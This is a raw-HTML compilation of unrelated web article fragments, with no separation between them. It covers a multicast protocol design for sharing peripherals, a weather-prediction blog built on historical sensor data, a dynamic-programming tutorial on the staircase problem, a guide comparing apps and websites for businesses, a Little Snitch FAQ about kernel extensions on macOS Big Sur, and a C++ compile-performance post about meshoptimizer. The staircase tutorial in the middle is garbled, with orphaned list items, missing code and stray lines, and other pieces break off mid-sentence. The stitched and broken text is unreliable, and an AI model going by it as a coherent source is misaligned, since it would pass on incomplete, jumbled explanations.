sink in realtime.</li><li>Putting your laptop to sleep while powering on your desktop will connect your keyboard/mouse to your desktop.</li></ol><p>...</p><p><img src="https://elvischidera.com/87eedac11aaec69de64cf478122ec310/multiplatform_modules.svg" alt="Multiplatform modules"></p><h3>Building</h3><ol><li><code>pcas-libs</code>: This is a KMP Gradle project.

A resilient multicast protocol is built on top of the transport layer. There are three types of messages:</p><ol><li><strong>Genesis</strong>: The first message a host sends, requesting other hosts to send their current blocks.</li><li><strong>Update</strong>: This is sent each time the blocks on a host changes.</li><li><strong>Heartbeat</strong>: This is periodically sent. After multiple missed heartbeats, a host is deemed dead by its peers and all its block could be independently deleted on each ledger.</li></ol><p>Each host maintains its local ledger. The network protocol guarantees that eventually, all ledgers will be consistent.</p><h5>Multicast Reliability</h5><p>Currently, only <strong>Update</strong> messages are classified as essential.</p><p><strong>Heartbeat</strong> messages are used as a form of <a href="https://en.wikipedia.org/wiki/Acknowledgement_(data_networks)">NACK</a>. A host detects synchronization issues from heartbeats and resends its current blocks.</p><p>While heartbeats are effective, the interval is too long to be relied on primarily for a highly interactive system like PCAS.</p><p>Reliable multicasting is an interesting problem. I explored two strategies:</p><h6>a. Using redundancy</h6><p>Blindly resend essential messages <code>x</code> times with a delay of <code>y + random jitter</code> on each attempt.</p><p>Let's consider a simple model. If the probability of successfully delivering a message is fixed at 0.50. Assuming each attempt is independent, there is a 0.97 probability that at least one message gets delivered in 5 attempts.</p><blockquote><p><strong>Napkin math</strong></p><p>Let b = 1 on success; 0 on failure</p><p>Pr(b = 1) = 0.50</p><p>Pr(b = 0) = 1 - Pr(b = 1) = 0.50</p><p>(b is a Bernoulli random variable)</p><hr><p>n = 5</p><p>z = n tries of b</p><p>(z is a Binomial random variable)</p><p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">(</mo><mn>1</mn><mo>≤</mo><mi>z</mi><mo>≤</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><mo fence="true">(</mo><mstyle displaystyle="false" scriptlevel="0"><mfrac linethickness="0px"><mi>n</mi><mi>i</mi></mfrac></mstyle><mo fence="true">)</mo></mrow><mi>P</mi><mi>r</mi><mo stretchy="false">(</mo><mi>b</mi><mo>=</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mi>i</mi></msup><mi>P</mi><mi>r</mi><mo stretchy="false">(</mo><mi>b</mi><mo>=</mo><mn>0</mn><msup><mo stretchy="false">)</mo><mrow><mi>n</mi><mo>−</mo><mi>i</mi></mrow></msup></mstyle></mrow><annotation encoding="application/x-tex">Pr(1 \leq z \leq n) = \displaystyle\sum_{i=1}^n \tbinom{n}{i} Pr(b = 1)^i Pr(b = 0)^{n - i}</annotation></semantics></math></span></span></p><p>Could also be calculated as 1 - Pr(z = 0)</p></blockquote><p>In practice, delivery probabilities aren't fixed and attempts are not independent. Despite the shortcoming of this strategy, it has the following benefits:</p><ol><li>It isn't dependent on the size of the network. Whether there are 2 or 10,000 peers, a host will only send its messages at a rate of <code>c / second</code>.</li><li>Peers that are just entering the network could benefit from these redundant messages.</li></ol><h6>b. Using ACKs</h6><p>Essential messages have a monotonically increasing sequence number. The initial sequence number is <code>0</code>. All hosts are expected to send an <code>Ack</code> message with the sequence number of the essential message. Retries are done with a truncated exponential backoff with jitter.</p><p>This strategy only sends fewer messages (more efficient) than the redundant strategy when the number of peers in a network is less than <code>x</code>. Some issues with this strategy:</p><ol><li>Using <code>ACKs</code> like TCP isn't scalable and runs the risk of <a href="https://courses.cs.washington.edu/courses/cse561/01sp/lectures/568.multicast2.pdf">ACKs implosion</a>.</li><li>The number of messages sent is dependent on the size of the network. A single rogue peer can cause the network to be spammed with ACKs and messages.</li><li>Figuring out which peer to expect ACKs from is complex.</li></ol><p>I initially went with ACKs but will be using the simple redundant strategy instead.</p><p>The network protocol data unit is a <code>Message</code>. Messages are marshaled to the <code>Protobuf</code> format and passed to the transport layer. The inverse happens when a message is received.</p><h3>Resource Allocation</h3><p>When two or more hosts use the same <code>3-tuple(service, profile, peripheral)</code>, a contention occurs. …</p></section></div>

<p><img src="https://makefastworkshop.com/hacks/pages/20160928/800wide.jpg" alt="" title="Data-Backed Methods for Weather Prediction of rain, storms, and sun."></p>
<p>We all like to think we're pretty good at <a href="http://www.americanscientist.org/bookshelf/pub/the-battle-between-intuition-and-deliberation">building intuition</a> about the world around us. After all, that's something we as humans do best; we're great learners by nature.</p>
<p>But it's also healthy to challenge our assumptions from time to time. Let's not forget, for example, that humans used to think the Earth was both flat and the center of the universe. With a little data and an openness to new ideas, our forebears eventually saw beyond the most convenient way to consider the cosmos and accepted a different reality.</p>
<h3>Mining Data For Useful Generalizations</h3>
<p>Today, we have access to massive amounts of data to help us challenge our assumptions and keep each other honest. It's not just about Googling facts when an argument comes up at dinner; we can also use data to refine the day-to-day generalizations that help us make sense of the world and dictate how we spend our time.</p>
<p>We've realized that we make a lot of daily assumptions about the weather in particular. Sometimes those assumptions are informed (like checking a weather app when you wake up to decide what to wear or leveraging knowledge from the <a href="http://www.almanac.com/">Farmer's Almanac</a> for gardening), but more often, our assumptions are based on either folklore (like <a href="https://en.wikipedia.org/wiki/Groundhog_Day">Groundhog Day</a>) or what data scientists call heuristics: broader first-hand observations and patterns we recognize over time.</p>
<p>There are plenty of <a href="http://www.jdnews.com/article/20140212/News/302129909">old wives' tales</a> about how to predict the weather via local observation (like <a href="http://farmersalmanac.com/weather/2009/06/08/can-leaves-predict-a-storm/">leaves turning over</a> before it rains or <a href="https://www.google.com/search?q=curly+hair+humidity+meme&amp;tbm=isch">hairs curling up</a> when it's humid), but we can go beyond that to crunch some actual numbers, since there is detailed weather information stretching back decades for much of the world (from sources like the <a href="https://darksky.net/dev/">Dark Sky API</a>). How can we leverage those numbers to act on what we think we already know?</p>
<h2>Hack #1 - Clouds Before Rain</h2>
<p><img src="https://makefastworkshop.com/hacks/pages/20160928/CloudsBeforeRain.jpg" alt="" title="Clouds rolling in before a rain storm."></p>
<p>We can safely assume that it's cloudy while it rains. So first things first, let's double-check what we <em>think</em> we know and see what the data show us.</p>
<p><img src="https://makefastworkshop.com/hacks/pages/20160928/CloudCoverCC.png" alt="" title="Cross Correlation between cloud cover and precipitation intensity with time shifts +/-24 hours."></p>
<p>The graph above shows data from 10 cities across the US with varying climates, elevations, and geographic influences. With 5 years of data recorded hourly and 4x interpolation, that gives us over <strong>1.75 Million data points</strong> to work with (each of which contains 12-15 sensor values). Specifically, the graph shows the <a href="https://en.wikipedia.org/wiki/Cross-correlation">cross correlation</a> between cloud cover and precipitation intensity as time is shifted +/-24 hours.</p>
<p>Clearly there's a peak in the center, meaning that it is in fact cloudiest when it's raining. Success!</p>
<p>But clouds come and go all the time, so the more interesting insight is how quickly the clouds roll in before it rains. Let's consolidate all the information down to the average for all locations and look at the weighted cloud cover before it rains.</p>
<p><img src="https://makefastworkshop.com/hacks/pages/20160928/CloudCoverBeforeAvg.png" alt="" title="Cloud cover before and after it rains weighted by precipitation intensity +/-24 hours."></p>
<p>Now we're getting somewhere. Not only does it get cloudy when it rains, but the rate at which it gets cloudy (cloud acceleration) increases as the storm approaches. This is especially true in the 4-6 hours before rainfall.</p>
<p><strong>Pro Tip: When the cloud cover seems to accelerate, expect rain within 4-6 hours.</strong></p>
<h2>Hack #2 - Wind Before Rain</h2>
<p><img src="https://makefastworkshop.com/hacks/pages/20160928/WindBeforeRain.jpg" alt="" title="Ready for rain in the morning wind."></p>
<p>We can also look at wind speed before a storm, like we did with cloud cover. Since the magnitude and direction of wind is highly variable between storm fronts and geographic locations, we expect the data to be a bit more bumpy and scattered.</p>
<p><img src="https://makefastworkshop.com/hacks/pages/20160928/WindSpeedBefore.png" alt="" title="Wind speed before and after it rains weighted by precipitation intensity +/-24 hours."></p>
<p>If you squint, you can see that while each location has its own characteristics, there are some significant similarities in the overall shapes. Specifically, notice the small spike in wind speed shortly before it rains (at time = 0 on the x axis).</p>
<p><img src="https://makefastworkshop.com/hacks/pages/20160928/WindSpeedBeforeAvg.png" alt="" title="Average wind speed before and after it rains weighted by precipitation intensity +/-24 hours."></p>
<p>By averaging all of the locations, the emergent shape becomes much clearer. The mean wind speed picks up in the 4-8 hours ahead of a storm front, then quickly falls back down in the hour before it actually starts to precipitate.</p>
<p>We can also look at wind bearing (direction the wind is blowing) before and after it rains.</p>
<p><img src="https://makefastworkshop.com/hacks/pages/20160928/WindBearingBefore.png" alt="" title="Wind direction before and after it rains weighted by precipitation intensity +/-24 hours."></p>
<p>The direction the wind blows depends heavily on location, but in the US most wind blows west to east (180 degrees on this graph). Since all locations' dominant wind direction falls within +/-90 degrees of each other, we can average them to look for trends without introducing significant artifacts.</p>
<p><img src="https://makefastworkshop.com/hacks/pages/20160928/WindBearingBeforeAvg.png" alt="" title="Average wind direction before and after it rains weighted by precipitation intensity +/-24 hours."></p>
<p>The average wind direction before and after it rains rounds out our intuition about stormy air movement. Not only does the wind speed pick up prior to wet weather, but the wind direction also changes by roughly 30 degrees before and after a storm (usually toward the north). And it doesn't take anything fancy to detect wind direction; just <a href="http://www.education.com/activity/article/wind_vane_first/">pin a straw</a> to the top of a pencil or <a href="https://physics.stackexchange.com/questions/266932/why-does-saliva-on-the-finger-give-correct-direction-of-wind">lick your finger</a> and hold it up in the air.</p>
<p><strong>Pro Tip: When it's been windy, then calms down and changes direction, expect rain within an hour.</strong></p>
<h2>Hack #3 - Temperature Before Rain</h2>
<p><img src="https://makefastworkshop.com/hacks/pages/20160928/CatTempWeather.jpg" alt="" title="Cat contemplating the effect of temperature on weather."></p>
<p>We also imagined that the temperature decreases when rain is on the way. But like curious cats (who, by the way, also have <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC1330962/">fine temperature sensitivity</a>), we wondered: how much of that is <em>feeling</em> cold because of darker sky and increased wind, versus actual temperature change?</p>
<p><img src="https://makefastworkshop.com/hacks/pages/20160928/TemperatureBefore.png" alt="" title="Temperature before and after it rains weighted by precipitation intensity +/-24 hours."></p>
<p>The graph above shows the temperature change for 5 years of data across 10 locations in the 24 hours before and after it rains. Each location has different temperature norms, so we expect them to be at different levels, but once again we can combine them and focus on their shape to look for patterns.</p>
<p><img src="https://makefastworkshop.com/hacks/pages/20160928/TemperatureBeforeAvg.png" alt="" title="Average temperature before and after it rains weighted by precipitation intensity +/-24 hours."></p>
<p>The drop in temperature is significant, with steady cooling of around 4 degrees Fahrenheit in 4 hours (with roughly 2 degrees falling in the final hour or so). That's enough to feel a chill in the air, even without the wind and overcast skies. Also notice that there's typically a minor upswing in temperature in the 4-6 hours before the drop, amplifying the feeling of rapid temperature change.</p>
<p><img src="https://makefastworkshop.com/hacks/pages/20160928/TempAndDewBeforeAvg.png" alt="" title="Average temperature and dew point before and after it rains weighted by precipitation intensity +/-24 hours."></p>
<p>We can also see what the dew point is doing while the temperature fluctuates to get a sense of how humid or muggy it feels. Notice that the dew point rises up like a ramp before the rain and then steadily falls away. When the temperature and dew point come closer together, the humidity will be higher, as the air is increasingly saturated with water.</p>
<p><strong>Pro Tip: When the temperature quickly drops and the humidity rises, expect rain in the next couple of hours.</strong></p>
<h2>Hack #4 - Predicting Sunshine</h2>
<p><img src="https://makefastworkshop.com/hacks/pages/20160928/SunnyMorning.jpg" alt="" title="Sunny morning over the lake."></p>
<p>While it seems most helpful to use weather data to better predict precipitation, we can use the same approach to predict clear, sunny skies. To do this, we created an anti-precipitation metric called <em>clear sky intensity</em> that factors in both a lack of rain and cloud cover.</p>
<p>We looked at two major factors for sunny skies: temperature and wind speed.</p>
<p><img src="https://makefastworkshop.com/hacks/pages/20160928/TempBeforeClearAvg.png" alt="" title="Average temperature before and after clear skies weighted by clear sky intensity +/-24 hours."></p>
<p>Naturally, the temperature typically climbs once skies are clear, but there is also an interesting clue beforehand - the shallow dip. We expect the temperature to rise and fall more or less in sync with days and nights, but the data suggest that an increased low temperature value (the minimum for those 24 hours) can be used as a predictor of clear skies on the way.</p>
<p><img src="https://makefastworkshop.com/hacks/pages/20160928/WindBeforeClearAvg.png" alt="" title="Average wind speed before and after clear skies weighted by clear sky intensity +/-24 hours."></p>
<p>We were also able to see a marked change in wind speed before the skies cleared up. While the average effect is small (only about 0.3 MPH difference), the pattern is compelling, particularly when used alongside other information. As wind speed decreases over a 12-hour window, clouds are likely to subside with it.</p>
<p><strong>Pro Tip: When low temps increase and winds die down, expect clear skies in the next 3-6 hours.</strong></p>
<h2>Hack #5 - Leveraging Pressure</h2>
<p><img src="https://makefastworkshop.com/hacks/pages/20160928/OldBarometer.png" alt="" title="19th century analog barometer."></p>
<p>While most of the major weather data recorded can be easily seen or felt, there is one that stands out as more elusive and abstract - barometric pressure.</p>
<p>Barometers have been used for centuries because of their apparent ability to "know" more about the upcoming weather for a single location than anything else. That's because weather patterns move around in high and low pressure systems that often take days to pass over an area.</p>
<p>Being able to sense those tiny fluctuations in pressure means being able to tell when a change in weather is on the way.</p>
<p><img src="https://makefastworkshop.com/hacks/pages/20160928/PressureCC.png" alt="" title="Cross correlation between pressure and precipitation intensity with time shifts +/-24 hours."></p>
<p>Notice how a dip in pressure is correlated with the rain intensity above, though the magnitude and exact timing of the pressure change is dependent on location.</p>
<p><img src="https://makefastworkshop.com/hacks/pages/20160928/PressureBeforeAvg.png" alt="" title="Average pressure before and after it rains weighted by precipitation intensity +/-24 hours."></p>
<p>By taking the average across all locations and looking at the relationship between rain and the preceding pressure, we can get a much better picture of what's going on. Generally, there is a significant decrease in pressure 3-6 hours before the rain starts coming down.</p>
<p><img src="https://makefastworkshop.com/hacks/pages/20160928/PressureBeforeClearAvg.png" alt="" title="Average pressure before and after clear skies weighted by clear sky intensity +/-24 hours."></p>
<p>The opposite is also true; a significant increase in pressure is associated with warmer, clearer weather. The graph above illustrates this by showing the average pressure before clear weather.</p>
<p>So for the old-school weather aficionado, keeping tabs on a barometer's reading over time may be the best way to predict what's on the way, especially if the power goes out (or if you're entertaining sea captains!).</p>
<p><strong>Pro Tip: When the barometric pressure dips quickly, expect rain in 3-6 hours. When it climbs steadily, look for sun in 6-24 hours.</strong></p>
<!--
  ## Meta Hack - Automating Analysis
  We've discovered (via more than a million data points, not just intuition!) that there are many ways to predict the upcoming weather using realtime, local information. This is the kind of data that can be easily measured with a little weather gadget in your kitchen or on your front porch, without needing to connect to the internet or put an app on your phone.
  But to make the most of the readings, we'd need to stay on top of the fluctuations and train ourselves to see the patterns in the data over time. So instead of making another graphical weather gadget that shows you specific values and how they evolve, we decided to build a circuit board that could do that for us. That's right, a *meta hack*.
  ![](./pages/20160928/LightNudgePCB.jpg "LightNudge circuit board with precision barometric sensor and realtime processing algorithm.")
  Our automated weather analysis device, called [LightNudge](https://www.kickstarter.com/projects/makefast/lightnudge-a-modern-barometer), uses a precision digital barometer and then keeps track of how the pressure fluctuates over time. It outputs the resulting forecast as colored light so that you can see its prediction from across the room (without needing to take out your reading glasses or open an app).
  Because changes in pressure are smooth and slow compared to other local weather variables (temperature, wind speed, etc.), LightNudge can be used as a much more reliable source of local weather prediction, forecasting out twice as far as a standard barometer alone (6-12 hours instead of 3-6).
  To emphasize the simplicity of its data-driven output and prepare it to sit unobtrusively in primary living spaces, we encased the components in a wood-and-marble body shaped like a triangle (well, technically a prism). Read more about it in the link above if you're curious.

<p>In a staircase problem, you try to calculate the different ways to reach the n’th stair where you are allowed to take up to m steps at a time. Say you are given a staircase problem with 5 stairs to climb, and you can take 1 or 2 steps at a time. How would you solve this problem? This and its variants are the focus of this article. It is a great problem to demonstrate the properties of dynamic programming and how to solve problems with it. Due to this, staircase problem and its variants like unique paths problem are commonly used as programming interview questions.</p>

<p>In this article, you will find the solutions to the following questions, as well as their time and space complexities:</p>

<ul>
  <li>Medium Difficulty: Staircase Problem - Different Ways to Reach the N’th Stair: Given n stairs, you can climb 1 or 2 stairs at a time. Count the number of different ways that you can reach the top.</li>
  <li>Medium Difficulty: Generalized Fibonacci-like Sequences: Same question but you can climb up to m steps at a time.</li>
  <li>Medium Difficulty: Generalized Fibonacci-like Sequences With Variable Steps: Same question but you can only climb 2, 3, 6 steps at a time.</li>
</ul>

<h2 id="overview">Overview</h2>
<ul>
  <li>Staircase problem is just a special case of “unique variations” questions like that of unique paths problem. I might make quick articles for those too, but you can apply the same methods that you will learn here to solve them also.</li>
  <li>You can identify variation finding questions if you are asked to find unique ways of doing XXX.</li>
  <li>Solutions to these problems are a subset of Dynamic Programming (the technique of solving a problem by dividing it into subproblems). We can solve them using recursion or iteration.</li>
  <li>Since solutions to these questions resemble Fibonacci Sequences, they are referred to as Fibonacci Puzzles, and they commonly appear in programming interviews and LeetCode. Especially the staircase problem!</li>
</ul>

<h2 id="staircase-problem---different-ways-to-reach-the-nth-stair">Staircase Problem - Different Ways to Reach the N’th Stair</h2>
<p>Question:</p>
<ul>
  <li>Given n stairs, you can climb 1 or 2 stairs at a time. Count the number of different ways that you can reach to the top.</li>
</ul>

<p>Difficulty:</p>
<ul>
  <li>Medium.</li>
</ul>

<p>Requirements:</p>
<ul>
  <li>There are no bounds specified for n.</li>
</ul>

<p>Analysis:</p>
<ul>
  <li>There is no upper bound to n so recursive solutions might blow up the call stack.</li>
  <li>There is no lower bound specified for n so users might try to put in zero as the parameter. Write a test for n=0 case.</li>
</ul>

<p>Formula:</p>

<p>To formulate a way to calculate all possible ways to reach a stair, think in reverse. What are the unique paths that lead to n’th stair. It is the sum of unique paths leading to n-1’th stair plus n-2’nd stairs.</p>

<ul>
  <li><code>ways(n) = ways(n-1) + ways(n-2)</code></li>
  <li>ways(4) = ways(3) + ways(2)</li>
  <li>ways(3) = ways(2) + ways(1)</li>
  <li>…</li>
</ul>

<p>This is Fibonacci Sequence!</p>

<p>Tip: Visualize in a regular (forward) manner and trying to figure out a pattern/formula. If that does not work, try to think in reverse (i.e. reverse path in this question).</p>

<p>Calculate solution for n=4:</p>
<ul>
  <li>Remember the formula: <code>ways(n) = ways(n-1) + ways(n-2)</code></li>
  <li>ways(4) = ways(3) + ways(2)</li>
  <li>ways(3) = ways(2) + ways(1)</li>
  <li>ways(2) = ways(1) + ways(0)</li>
  <li>ways(1) = 1</li>
  <li>ways(0) = 1</li>
  <li>This is the iterative Fibonacci Solution!</li>
</ul>

    </ul>
  </li>
  <li>Continue with stair 1:
    <ul>

    </ul>
  </li>
  <li>Continue with stair 2:
    <ul>
      <li>ways(2) = ways(1) + ways(0) = 1 + 1 = 2</li>
    </ul>
  </li>
  <li>Calculate consecutive ones via adding the previous two until you reach n (stair count).</li>

      <li>No extra variables allocated in mem per recursive call.</li>
    </ul>

  <li>Call Stack: O(n)
    <ul>
      <li>Depth of recursion tree will grow linearly.</li>

<h4 id="recursion-trees">Recursion Trees:</h4>

<p>Below illustration demonstrates how inefficient recursive solution is. Notice the duplicated branches. They are the source of inefficiency. Solution for this is to use memoization.</p>

<p><img src="https://quanticdev.com/algorithms/dynamic-programming/staircase-problems/media/recursion_tree.png" alt="Recursion Tree"></p>

<p>Following is an illustration of how recursion tree is traversed in our <code>ways()</code> function with 5 steps:</p>

<ul>
  <li>If thinking in forward does not work, try to solve the problem backwards. Reverse thinking can help you find ways to utilize dynamic programming.</li>

<p>Question:</p>
<ul>
  <li>Given n stairs, you can climb up to m stairs at a time. Count the number of different ways that you can reach to the top.</li>
</ul>

<p>Difficulty:</p>
<ul>
  <li>Medium.</li>
</ul>

<p>Formula:</p>

<p>We generate our formula again using reverse thinking. We will start form the top and calculate unique paths leading to top from previous steps.</p>

<p>*<code> ways(n, m) = ways(n-1, m) + ways(n-2, m) + ... + ways(n-m, m)</code></p>
<ul>
  <li>If m=3 (which means you can take 1, 2, or 3 steps at a time):</li>
  <li>ways(4) = ways(3) + ways(2) + ways(1)</li>
  <li>ways(3) = ways(2) + ways(1) + ways(0)</li>
  <li>ways(2) = ways(1) + ways(0)</li>
  <li>This is a Fibonacci-like sequence!</li>
</ul>

<h3 id="solution-iteration-fibonacci-like-sequences">Solution: Iteration (Fibonacci-like Sequences)</h3>
<ul>
  <li>Start with stairs 0 and 1.</li>
  <li>Calculate consecutive ones via adding the previous m numbers.</li>

  <li>This is essentially using sliding windows technique to calculate Fibonacci-like sequence. (more info next)</li>

return stairs[-1]

<h2 id="tips-1">Tips</h2>
<ul>
  <li>Fibonacci sequences can be calculated in O(logn) time using Matrix Exponentiation or directly with the Fibonacci formula. This is probably an overkill for interview situations though.</li>
  <li>Write tests if you have time. Especially for corner cases like n=0, n=1, etc.</li>
  <li>Like the Staircase Problem, there are many more possible interview questions that can utilize Fibonacci-like sequences: Unique Paths Problem, Decode Ways Problem, etc. I will write separate articles for them so follow me on my socials if you don’t want to miss them!</li>

<ul>
  <li>Medium.</li>
</ul>

<p>Formula:</p>

<p>Once again, we formulate our solution using top-to-bottom approach.</p>

<ul>
  <li><code>ways(n, [x, y, z, ...]) = ways(n-x, [x, y, z, ...]) + ways(n-y, [x, y, z, ...]) + ways(n-z, [x, y, z, ...]) + ...</code></li>
  <li>If x=2, y=3, z=5:</li>

        <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>For some businesses, offering their users an app adds tremendous value to their users’ lives, while for some others, it only adds to users’ app fatigue.&nbsp;</p>
<!--more-->
<p>With observations like this come the burning questions — How can you tell where your business stands in this spectrum? How do you know if an app or website would serve your business better? How do they benefit businesses?</p>
<p>To help clear the mist, here’s a simplified guide to when you need an app, when you need a website, and when you need both.</p>
<h2><strong>When You Need an App</strong></h2>
<p>Apps are specifically designed to run mostly on smartphones and tablets. They require users to install and download updates in order to use a service.&nbsp;</p>
<p>This might be a little work for your users especially if they’re already experiencing app fatigue with their existing apps — handing them another app to install might deter them from using your service at all.&nbsp;</p>
<p>Compared to websites, apps also generally cost more and take longer to build because different versions for native apps need to be considered for different devices.</p>
<p>Despite that, having an app for your business can still be advantageous in many ways.</p>
<h3><strong>On the plus side, apps:</strong></h3>
<p>1. Can be discovered through app stores<br>2. Can leverage native device functionality<br>3. Allow for easier user behavior tracking<br>4. Allow for offline functions<br>5. Give your users a more customized experience, deepening existing relationships with users</p>
<h2><strong>An app might work for you if your platform:</strong></h2>
<p>1. Aims to engage with returning users<br>2. Requires personalization (e.g. push notifications, geolocation, etc.)<br>3. Needs to access device functionality (e.g. camera, microphone, contacts, etc.)</p>
<h2><strong>When You Need a Website</strong></h2>
<p>Just because apps are a “gold rush” for businesses these days doesn’t mean you necessarily need one.&nbsp;</p>
<p>Sure, websites may limit your customers to browsers, web-based notifications, and service that depends on network connection, but sometimes a mobile-friendly website with responsive design is all you need to up user satisfaction.</p>
<h3><strong>On the plus side, websites:</strong></h3>
<p>1. Cost less<br>2. Take less time to build<br>3. Can run on both mobile and desktop browsers<br>4. Are easier to discover through web searches<br>5. Are easier to share with links<br>6. Are instantly available and don’t require downloads or updates</p>
<h3><strong>A website might work for you if your platform:</strong></h3>
<p>1. Aims mainly to provide information<br>2. Requires minimal personalization<br>3. Doesn’t need to access device functionality</p>
<br>
<h2><strong>When You Need Both</strong></h2>
<p>You really don’t have to only choose one to stick to. It's extremely common for today’s businesses to combine a website with a mobile app. This combo allows them to not only welcome new customers, but also give their loyal returning customers a personalized experience with exclusive content and deals.</p>
<p>When your app and website work together to serve both new customers and existing ones, you get the best of both worlds. Other than giving your customers flexibility and choice, here are some other reasons the app+website combo is valuable to business owners.</p>
<h3><strong>To Gain Your Customers’ Trust</strong></h3>
<p>Typically, businesses start building awareness with a website before they launch an app. This is because websites are a great way to start new relationships with customers, while apps are great for deepening those existing relationships.&nbsp;</p>
<p>In any business, new customers need to see the value of your service before they decide to become a regular. In this case, your users need to be convinced that the service you offer is important to them, before they hit the download button and give you a place on their phones.</p>
<h3><strong>To Market Your App Better</strong></h3>
<p>Websites also give business owners way more freedom in the way they want to market their app.&nbsp;</p>
<p>Did you know you’re limited to only 4000 characters to pitch your app to users on app stores? There are also limitations on the size, quality, and number of screenshots and videos you can display on your app’s page.&nbsp;</p>
<p>On your own website, you can give visitors a deeper dive into your app’s features with much more dynamic visuals.&nbsp;</p>
<h2><strong>Other Ways to Find Out&nbsp;</strong></h2>
<p>Looking at both objective and subjective clues is the best way to find the perfect solution. Aside from the checklists above, it never hurts to mix in your observations.</p>
<h3><strong>Look at Your Competitors</strong></h3>
<p>If you’re lost on what you should do next, study examples in your industry. Pick some of the businesses closest to what you envision yours to be, and ask these questions:&nbsp;</p>
<p>What are they doing?&nbsp;<br>How is their app or website helping them?&nbsp;<br>If you take a different route, how can you make up for what they’ve gained on their route?</p>
<h3><strong>Know Your Users</strong></h3>
<p>It’s also important to know your target market and their needs. Without analyzing data and paying attention to user behavior, you can end up with nothing but negative reception when you throw your users the opposite of what they want.</p>
<h3><strong>Get Help from an Agency</strong></h3>
<p>An alternative to figuring it out on your own is to find a good digital agency to help you out.&nbsp;</p>

<h3>Can Little Snitch 4 be installed on macOS 11 Big Sur?</h3>
</label></p><div>
<p>Little Snitch 4 needs to install a <em>Network Kernel Extension</em> in order to perform its network traffic filtering. This kind of kernel extension is no longer supported on macOS Big Sur. The operating system now refuses to load such kernel extensions by default.</p>
<p>The latest <a href="https://www.obdev.at/products/littlesnitch/download.html">version 5 of Little Snitch</a> no longer uses this unsupported Kernel API. It uses the newer System Extension API provided by Apple and is therefore fully compatible with macOS Big Sur.</p>
<p>Alternatively, it’s currently still possible to manually approve the loading of particular kernel extensions. This requires to start up your computer from macOS Recovery and enter a Terminal command to grant the necessary permission. However, Apple may remove this possibility at any time with a future update of macOS Big Sur.</p>
<ol>
<li>
<p><a href="https://support.apple.com/en-us/HT201314">Start up your computer from macOS Recovery</a>: Restart your computer and hold Command-R during startup.</p>
</li>
<li>
<p>Open the Terminal application from the Utilities menu in the menu bar.</p>
</li>
<li>
<p>Enter the following command and press Return:<br><code>spctl kext-consent add MLZF7K7B5R</code></p>
</li>
<li>
<p>Restart your computer by choosing Restart from the Apple menu ().</p>
</li>
<li><a href="https://www.obdev.at/support/littlesnitch/245914482614726">Uninstall Little Snitch 5</a> if it’s already installed on your computer.</li>
</ol>
<p>After this approval process you should be able to install Little Snitch 4.6.</p>
<p><strong>Important Note:</strong> Older versions of Little Snitch (prior to version 4.6) cannot be installed on macOS Big Sur, not even with this manual approval.</p>

17 Jan 2019

</span></p><p>A library that I work on often these days, <a href="https://github.com/zeux/meshoptimizer">meshoptimizer</a>, has changed over time to use fewer and fewer C++ library features, up until the current state where the code closely resembles C even though it uses some C++ features. There have been many reasons behind the changes - dropping C++11 requirement allowed me to make sure anybody can compile the library on any platform, removing <code>std::vector</code> substantially improved performance of unoptimized builds, removing <code>algorithm</code> includes sped up compilation. However, I’ve never quite taken the leap all the way to C with this codebase. Today we’ll explore the gamut of possible C++ implementations for one specific algorithm, mesh simplifier, henceforth known as <code>simplifier.cpp</code>, and see if going all the way to C is worthwhile.</p>

<!--more-->



<p>Mesh simplifier is an implementation of an edge collapse quadric based simplification algorithm with many tweaks to improve performance and quality of the result. The algorithm is still in development but has had a fair share of effort put into it. The details are really not that important, but it helps to understand the structure and size:</p>

<ul>
  <li>The entire algorithm is implemented in one standalone .cpp file that has almost exactly a thousand lines of code (1004 as of this writing), including comments, blank lines, lines with braces, etc.</li>
  <li>The algorithm almost exclusively uses heap-allocated arrays as data structures, using raw pointers for this</li>
  <li>The algorithm needs a hash table and a sorting routine, implemented from scratch</li>
</ul>

<p>We will look at several variations of the implementation, starting with one that uses C++ containers and algorithms that would be helpful for that algorithm, then remove one C++ feature at a time and measure compilation speed and runtime performance as we go on three compilers, gcc 7.3, clang 6 and msvc 2017 on Core i7-8700K running Windows 10 / Ubuntu 16.10. We’ll measure compilation performance by just compiling one .cpp file (with default options in debug and <code>-O2</code> optimization level in release), and measure runtime performance by simplifying <code>buddha.obj</code> (1M triangle mesh) to 25% of its size. After we reach the current implementation, we will explore the option of changing the code to pure C99.</p>

<blockquote>
  <p>Note that the way I arrived at these implementations is by taking the code you can see in the repository right now, and changing it to be more idiomatic Modern C++<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. However, these are generally very close to past versions of <code>simplifier.cpp</code> - the difference being that it’s possible to directly compare the variants now.</p>
</blockquote>



<p>The version we’re starting with is the original <code>simplifier.cpp</code> from <a href="https://github.com/zeux/meshoptimizer/blob/c93ba0987baa84bd73b61edf1c0ba7ba2e48df4b/src/simplifier.cpp">current meshoptimizer master</a>, with the following modifications:</p>

<ul>
  <li>All raw pointers changed to <code>std::vector</code></li>
  <li>Instead of a home-grown hash table we use <code>std::unordered_set</code></li>
  <li>Instead of a home-grown sorting routine we use <code>std::sort</code></li>
</ul>

<p>Here’s the performance that we’re getting as a result:</p>

<table>
  <thead>
    <tr>
      <th>compiler/stl</th>
      <th>debug compile</th>
      <th>release compile</th>
      <th>debug run</th>
      <th>release run</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>gcc</td>
      <td>520 ms</td>
      <td>646 ms</td>
      <td>2273 ms</td>
      <td>572 ms</td>
    </tr>
    <tr>
      <td>clang</td>
      <td>400 ms</td>
      <td>684 ms</td>
      <td>2356 ms</td>
      <td>566 ms</td>
    </tr>
    <tr>
      <td>clang libc++</td>
      <td>400 ms</td>
      <td>725 ms</td>
      <td>1535 ms</td>
      <td>584 ms</td>
    </tr>
    <tr>
      <td>msvc</td>
      <td>422 ms</td>
      <td>566 ms</td>
      <td>36317 ms</td>
      <td>579 ms</td>
    </tr>
  </tbody>
</table>

